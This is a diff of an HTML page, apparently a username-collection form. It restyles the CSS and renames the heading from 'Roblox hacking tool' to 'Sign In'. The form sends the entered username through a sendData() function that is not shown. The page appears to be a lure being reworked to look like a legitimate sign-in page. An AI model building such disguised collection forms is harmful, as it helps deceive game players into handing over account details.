@@ -9,8 +9,8 @@
         body {
             margin: 0;
             padding: 0;
-            background: #0d0d0d;
-            font-family: Arial, sans-serif;
+            background: #0b0b0d;
+            font-family: "Inter", Arial, sans-serif;
             color: white;
             display: flex;
             justify-content: center;
@@ -19,61 +19,76 @@
         }
 
         .container {
-            background: #1a1a1a;
-            padding: 40px;
-            border-radius: 12px;
-            width: 320px;
-            box-shadow: 0 0 25px rgba(0, 0, 0, 0.5);
+            background: #16161a;
+            padding: 45px;
+            border-radius: 14px;
+            width: 340px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
+            text-align: center;
         }
 
         h2 {
-            text-align: center;
-            margin-bottom: 25px;
-            font-weight: 300;
+            margin-bottom: 20px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+            color: #e5e5e5;
         }
 
         input {
             width: 100%;
             padding: 12px;
-            margin-bottom: 15px;
+            margin-top: 15px;
+            margin-bottom: 20px;
             border-radius: 8px;
             border: none;
-            background: #333;
+            background: #222226;
             color: white;
-            font-size: 16px;
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            background: #2c2c31;
+            transform: scale(1.02);
         }
 
         button {
             width: 100%;
-            padding: 12px;
-            background: #4a4a4a;
+            padding: 14px;
+            background: linear-gradient(135deg, #4a4a4a, #6e6e6e);
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 16px;
             color: white;
             cursor: pointer;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            transition: 0.25s ease;
         }
 
         button:hover {
-            background: #5a5a5a;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 18px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(135deg, #595959, #7a7a7a);
         }
 
         .success {
-            text-align: center;
-            margin-top: 10px;
+            margin-top: 15px;
             color: #4caf50;
             display: none;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>Roblox hacking tool</h2>
+        <h2>Sign In</h2>
 
         <input type="text" id="username" placeholder="Username">
 
-        <button onclick="sendData()">Sign In</button>
+        <button onclick="sendData()">Continue</button>
 
         <p class="success" id="msg">Sent!</p>
     </div>
